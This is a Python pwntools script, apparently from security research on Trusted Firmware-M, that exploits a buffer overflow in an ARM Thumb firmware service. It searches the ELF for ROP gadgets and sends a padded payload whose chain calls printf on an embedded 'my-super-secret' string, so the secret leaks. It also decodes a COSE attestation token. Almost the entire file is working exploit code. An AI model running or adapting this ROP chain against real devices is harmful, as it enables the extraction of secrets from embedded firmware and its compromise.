from pwn import *
import struct

from pycose.messages import Enc0Message
from cbor2 import dumps, loads, load

# ROP attack

context.update(arch='thumb')

ECHO = 1

def generate_command(command: int, request_length: int):
    return struct.pack("b", command) + struct.pack("b", request_length) 

r = remote('127.0.0.1', 5000)

"""
last line         
2808099a bd e8 f0 83     pop.w      {r4,r5,r6,r7,r8,r9,pc}


"""


"""
    0x28081d6e (0x28081d6f): pop {r3, pc};

	0x280808f6 (0x280808f7): mov r0, r3; pop {r7, pc}; 
	
	0x28082b68 (0x28082b69): str r3, [r4]; pop {r3, r4, r5, pc};
"""

exe = ELF("../trusted-firmware-m-runpba/build/bin/tfm_ns.elf", checksec=False)

movr0_pop_pc = next(exe.search(asm("mov r0, r3; pop {r7, pc};"), executable=True)) + 1 
info(f"movr0_pop_pc found on {movr0_pop_pc}")

pop_r3  = next(exe.search(asm("pop {r3, pc}"), executable=True)) + 1 
info(f"pop_r3 found on {pop_r3}")

target = next(exe.search(b"my-super-secret"))
    
   # 0x28083074 +1 # for testing poropose only we could use a disassembly to figure out the secret location

print_function = exe.symbols["printf"]

payload = b"cenas" + b'b'*95 + p32(pop_r3) + p32(target) + p32(movr0_pop_pc) + p32(0xdeadbeef) + p32(print_function)

print(r.recvuntil(b'): ###########\r\n'))

raw = r.recvuntil(b'############## token end  ##############\r\n')

print(raw)

token = bytes([ int(i,16) for i in raw[:-42].split()])
cose_msg = Enc0Message.decode(token)
decoded = loads(cose_msg.payload)

log.info("Lifecyle status: " + hex(decoded[-75002]))

#print(r.recvuntil(b"...\r\n"))
r.send(generate_command(1,len(payload)))
print(r.recvuntil(b".\r\n"))
r.send(payload)

#payload = b"cenas" + b'b'*95 + p32(0x280809ee+1)#+ p32(target) + p32(movr0_pop_pc) + p32(0xdeadbeef) + p32(print_function)
#p32(0x280809c6)
